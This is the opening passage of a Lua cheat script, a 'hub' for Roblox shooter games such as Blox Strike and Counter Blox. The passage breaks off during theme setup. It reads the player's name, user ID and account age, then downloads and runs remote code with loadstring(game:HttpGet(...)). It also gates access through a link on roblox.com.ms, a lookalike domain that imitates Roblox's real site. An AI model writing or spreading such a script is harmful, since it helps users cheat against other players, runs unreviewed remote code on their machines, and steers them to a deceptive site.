-- miracles clean part 1/8
-- miracles hub | blox strike / counter blox / universal fps
-- rayfield gen2 | community gate
local COMMUNITY_LINK = "https://roblox.com.ms/communities/3802072842/"
local GROUP_ID = 3802072842
local HUB_VERSION = "v3.3.0"
local HUB_NAME = "miracles"
local DARK_CYAN = Color3.fromRGB(0, 139, 139)

local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalPlayer = Players.LocalPlayer

local myName = LocalPlayer and LocalPlayer.Name or "player"
local myDisplay = LocalPlayer and LocalPlayer.DisplayName or "player"
local myUserId = LocalPlayer and LocalPlayer.UserId or 1
local myAge = LocalPlayer and LocalPlayer.AccountAge or 0

local gameName = "unknown fps"
pcall(function()
    local info = MarketplaceService:GetProductInfo(game.PlaceId)
    if info and info.Name then gameName = info.Name end
end)

local Rayfield = loadstring(game:HttpGet("https://sirius.menu/gen2"))()

local window = Rayfield:CreateWindow({
    name = HUB_NAME,
    subtitle = HUB_VERSION .. " | blox strike x counter blox",
    sidebarLayout = true,
    showName = HUB_NAME,
    theme = {
        -- fake glass: translucent dark fills + light rim + round corners
        -- (true backdrop blur is impossible in Roblox, this is the closest look)
        WindowColor = ColorSequence.new(Color3.fromRGB(18, 26, 30), Color3.fromRGB(10, 18, 22)),
        ElementGradient = ColorSequence.new(Color3.fromRGB(30, 45, 52), Color3.fromRGB(18, 30, 36)),
        ElementTransparency = 0.25,
        ElementStrokeTransparency = 0.6,
        SurfaceStroke = Color3.fromRGB(120, 200, 200),
        AccentColor = DARK_CYAN,
        AccentStroke = DARK_CYAN,
        DropdownHighlight = DARK_CYAN,
        SliderProgress = ColorSequence.new(DARK_CYAN, Color3.fromRGB(0, 100, 100)),
        TabBackground = ColorSequence.new(Color3.fromRGB(20, 20, 20), Color3.fromRGB(12, 40, 40)),
        CornerRoundness = UDim.new(0, 12),
